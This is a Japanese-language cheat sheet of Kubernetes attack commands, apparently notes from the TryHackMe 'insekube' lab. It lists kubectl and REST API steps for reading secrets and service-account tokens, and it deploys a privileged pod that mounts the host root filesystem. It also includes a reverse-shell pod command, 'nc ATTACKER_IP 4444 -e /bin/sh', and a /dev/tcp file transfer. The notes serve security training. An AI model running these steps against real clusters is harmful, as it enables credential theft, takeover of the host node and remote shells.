# Kubernetes

https://tryhackme.com/room/insekube

自分の権限を確認

```sh
kubectl auth can-i --list

kubectl auth can-i --list --token=${TOKEN}
```

secrets をgetできる場合

```sh
kubectl get secrets

# デフォルト名前空間以外も含める
kubectl get secrets -A

kubectl get secrets <secret-name>

# -o yaml を付けないと表示されない内容がある
kubectl get secrets <secret-name> -o yaml
```

```sh
kubectl describe secret 
```

```sh
kubectl exec -it <pod-name> --token=${TOKEN} -- /bin/bash
```

```sh
kubectl get pods

# デフォルト名前空間以外も出てくる
kubectl get pods -A

# ボリュームなども表示される
kubectl get pods -A -o yaml
```

ジョブ

```sh
kubectl get job -n <namespace> -o json
```

ログ

```sh
kubectl logs <pod> -n <namespace>
```

## すべてを許可する設定のPod設定

権限さえあれば。

```sh
kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

privesc.yml 

```yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

ホストの / を ゲストの /host にマウントしていることに注意

デプロイ

```sh
kubectl apply -f privesc.yml --token=${TOKEN}
```

実行

```sh
# インタラクティブ
kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash

# TTYが無い場合（Webシェルなど）
kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/root
```

## トークン

```sh
cat /var/run/secrets/kubernetes.io/serviceaccount/token

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

PodでK8S環境を確認

```sh
# env | grep KUBERNETES
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.152.183.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
KUBERNETES_SERVICE_HOST=10.152.183.1
```

## バイナリ

[最新バイナリダウンロード](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/?source=post_page-----9dbd2cada99f---------------------------------------#install-kubectl-binary-with-curl-on-linux)

```sh
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

```sh
nc -lvnp 4444 < kubectl

bash -c 'cat < /dev/tcp/192.168.138.236/4444 > kubectl'
```

## REST API

```sh
API="https://192.168.138.236:6443"
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

```sh
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  $API/version
```

```sh
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces
```

```sh
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/pods
```

```sh
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/pods/everything-allowed-exec-pod
```

```sh
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/default/pods/everything-allowed-exec-pod/log"
```

```sh
# pod.json は YAML ではなく JSON にするのが確実
curl -k \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @pod.json \
  $API/api/v1/namespaces/default/pods
```

```sh
curl -k \
  -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/default/pods/everything-allowed-exec-pod
```

curl による REST API の直叩きではExecを実行できないが、コマンドを実行したい場合、kubectlをコピーしたり、Podの定義で実行するコマンドを指定したりできる。

```
"command": ["/bin/sh", "-c", "nc ATTACKER_IP 4444 -e /bin/sh"]
```

## 使えるバイナリ

### microk8s

下記の形でコマンドを実行する

```sh
microk8s kubectl ...
```

### k0s系

- k0s
- k0sctl

### k3s / RKE 系

- k3s
- rke2

### Canonical / Rancher 系

- rancher
- fleet

### 検索例

```sh
find / -maxdepth 4 -type f \( -name 'k0s*' -o -name 'k3s*' -o -name 'rke*' \) 2>/dev/null
```

## ファイルシステム

### pods

```sh
ls -al /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/
```

### kubelet管理領域

```sh
ls -al /var/lib/kubelet/pods/
```

### k0s, k3s

```sh
ls -la /var/lib/k0s/containerd/

ls -al /var/lib/rancher/k3s/agent/containerd/
```
